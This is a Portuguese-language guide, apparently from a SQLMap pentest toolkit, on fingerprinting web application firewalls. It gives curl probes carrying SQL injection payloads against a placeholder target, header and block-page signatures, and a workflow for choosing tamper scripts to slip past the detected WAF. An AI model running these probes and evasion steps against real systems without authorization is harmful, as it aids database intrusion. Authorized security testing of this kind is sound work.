# Detecção de WAF (Web Application Firewall)

## Por que Detectar o WAF Primeiro

Identificar o WAF antes de iniciar o scan permite:
- Selecionar os tampers corretos
- Ajustar nível de agressividade
- Evitar bloqueio de IP prematuro
- Aumentar taxa de sucesso do SQLMap

## Detecção com SQLMap

```bash
# Detecção automática de WAF
sqlmap -u "http://alvo.com/?id=1" --identify-waf

# Com flag mais detalhada
sqlmap -u "http://alvo.com/?id=1" --identify-waf -v 3
```

## Detecção Manual — Cabeçalhos HTTP

```bash
# Verificar cabeçalhos de resposta
curl -I "http://alvo.com"

# Com payload para provocar WAF
curl -I "http://alvo.com/?id=1' OR '1'='1"
```

### Assinaturas por Cabeçalho

| WAF | Cabeçalho Característico |
|-----|--------------------------|
| Cloudflare | `CF-Ray`, `Server: cloudflare` |
| Imperva | `X-Iinfo`, `X-CDN: incapsula` |
| Sucuri | `X-Sucuri-ID`, `X-Sucuri-Cache` |
| Barracuda | `X-Barracuda-AppID` |
| AWS WAF | `X-Amzn-RequestID`, `X-Amz-Cf-Id` |
| F5 BIG-IP | `X-WA-Info` |

## Detecção por Comportamento

### Teste 1: Payload SQL Básico
```bash
curl -s "http://alvo.com/?id=1 UNION SELECT 1,2,3--" -o /dev/null -w "%{http_code}"
```
- **200**: Sem WAF ou WAF não detectou
- **403**: WAF bloqueou (provável)
- **503**: Cloudflare (challenge page)

### Teste 2: Verificar Corpo da Resposta
```bash
curl -s "http://alvo.com/?id=1' OR 1=1--" | grep -iE "cloudflare|incapsula|sucuri|barracuda|aws"
```

### Teste 3: Código de Status vs Payload Normal
```bash
# Resposta normal
NORMAL=$(curl -o /dev/null -s -w "%{http_code}" "http://alvo.com/?id=1")

# Resposta com payload
WAF=$(curl -o /dev/null -s -w "%{http_code}" "http://alvo.com/?id=1 UNION SELECT NULL--")

echo "Normal: $NORMAL | Com payload: $WAF"
```

## Ferramenta: detector_waf.py

```bash
# Detecção simples
python utils/detector_waf.py --alvo "http://alvo.com/?id=1"

# Com envio de payloads (mais agressivo)
python utils/detector_waf.py --alvo "http://alvo.com/?id=1" --probe

# Com recomendação de tampers
python utils/detector_waf.py --alvo "http://alvo.com/?id=1" --probe --recomendar
```

## Identificação por Página de Bloqueio

| WAF | Texto na Página de Bloqueio |
|-----|----------------------------|
| Cloudflare | "Ray ID:", "Attention Required! \| Cloudflare" |
| ModSecurity | "Mod_Security", "NAXSI", "406 Not Acceptable" |
| Imperva | "Incapsula incident ID", "_Incapsula_Resource" |
| F5 BIG-IP | "The requested URL was rejected", "BIG-IP" |
| Akamai | "Reference #", padrão hexadecimal |
| Sucuri | "Sucuri Website Firewall", "Access Denied - Sucuri" |

## Próximo Passo após Detecção

1. WAF identificado → selecionar tampers com `seletor_tamper.py`
2. WAF não identificado → usar perfil `generico` com tampers básicos
3. Sem WAF → scan direto sem tampers ou com nível mínimo

```bash
# Após detectar Cloudflare
python utils/seletor_tamper.py --waf cloudflare --dbms mysql
# Output: --tamper=space2comment,randomcase,charencode
```
